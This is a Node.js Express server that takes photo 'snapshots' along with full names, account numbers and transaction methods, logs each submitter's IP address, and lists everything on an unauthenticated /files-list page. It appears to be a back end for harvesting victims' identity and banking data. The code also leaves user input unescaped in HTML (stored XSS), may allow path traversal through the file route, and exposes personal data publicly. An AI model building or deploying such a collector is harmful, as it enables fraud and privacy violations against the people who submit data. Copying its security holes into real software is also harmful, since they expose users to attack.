// server.js
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const app = express();
const PORT = process.env.PORT || 10000;

// Behind Render proxy – lets us trust x-forwarded-for
app.set("trust proxy", true);

// ---------- Helpers ----------
function getClientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.ip;
}

// Ensure /uploads exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Multer storage for snapshots
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname || ".png");
    const name = `${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`;
    cb(null, name);
  }
});

const upload = multer({ storage });

// ---------- Middleware ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// ---------- Routes ----------

// Root – show your form page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "recorder.html"));
});

// Handle photo upload
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  if (!req.file) {
    return res.status(400).send("No photo uploaded");
  }

  const clientIp = getClientIp(req);
  const fileName = req.file.filename;

  const {
    fullName = "",
    accountNumber = "",
    transactionMethod = ""
  } = req.body;

  console.log("Upload from IP:", clientIp, "file:", fileName);

  // Append to CSV log
  const logLine = [
    new Date().toISOString(),
    clientIp,
    JSON.stringify(fullName),
    JSON.stringify(accountNumber),
    JSON.stringify(transactionMethod),
    fileName
  ].join(",") + "\n";

  fs.appendFile(path.join(__dirname, "upload-log.csv"), logLine, err => {
    if (err) console.error("Failed to write log:", err);
  });

  res.send(`Photo stored as: ${fileName} (IP: ${clientIp})`);
});

// Serve individual files
app.get("/files/:name", (req, res) => {
  const filePath = path.join(uploadDir, req.params.name);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }
  res.sendFile(filePath);
});

// ---------- NEW: /files-list with IP + metadata ----------
app.get("/files-list", (req, res) => {
  const logPath = path.join(__dirname, "upload-log.csv");

  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      if (err.code === "ENOENT") {
        // No log yet
        return res.send("<h1>Uploaded Photos</h1><p>No uploads yet.</p>");
      }
      return res.status(500).send("Error reading upload log");
    }

    const lines = data.trim().split("\n").filter(Boolean);

    // CSV parsing that respects our quoted fields
    const rows = lines.map(line => {
      // split by commas, but ignore commas inside quotes
      const parts = line.match(/(".*?"|[^",\s]+)(?=\s*,|\s*$)/g) || [];
      const [
        iso = "",
        ip = "",
        fullName = '""',
        accountNumber = '""',
        transactionMethod = '""',
        fileName = ""
      ] = parts;

      const safe = s => {
        try { return JSON.parse(s); } catch { return s.replace(/^"|"$/g, ""); }
      };

      return {
        time: iso,
        ip: ip,
        fullName: safe(fullName),
        accountNumber: safe(accountNumber),
        transactionMethod: safe(transactionMethod),
        fileName: fileName
      };
    }).reverse(); // newest first

    const rowsHtml = rows.map(r => {
      const link = `/files/${encodeURIComponent(r.fileName)}`;
      return `
        <tr>
          <td>${r.time}</td>
          <td>${r.ip}</td>
          <td>${r.fullName}</td>
          <td>${r.accountNumber}</td>
          <td>${r.transactionMethod}</td>
          <td><a href="${link}" target="_blank">${r.fileName}</a></td>
        </tr>`;
    }).join("");

    res.send(`
      <!doctype html>
      <html>
      <head>
        <meta charset="utf-8" />
        <title>Uploaded Photos</title>
        <style>
          body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
                 padding: 20px; background:#f5f5f5; }
          h1 { margin-bottom: 12px; }
          table { border-collapse: collapse; width: 100%; background:#fff; }
          th, td { border: 1px solid #ccc; padding: 6px 8px; font-size: 13px; }
          th { background:#e5e7eb; text-align:left; }
          tr:nth-child(even) { background:#f9fafb; }
          a { color:#1d4ed8; text-decoration:none; }
          a:hover { text-decoration:underline; }
        </style>
      </head>
      <body>
        <h1>Uploaded Photos</h1>
        <table>
          <thead>
            <tr>
              <th>Timestamp (UTC)</th>
              <th>IP Address</th>
              <th>Full Name</th>
              <th>Account #</th>
              <th>Method</th>
              <th>File</th>
            </tr>
          </thead>
          <tbody>
            ${rowsHtml || "<tr><td colspan='6'>No uploads yet.</td></tr>"}
          </tbody>
        </table>
      </body>
      </html>
    `);
  });
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`Listening on ${PORT}`);
});
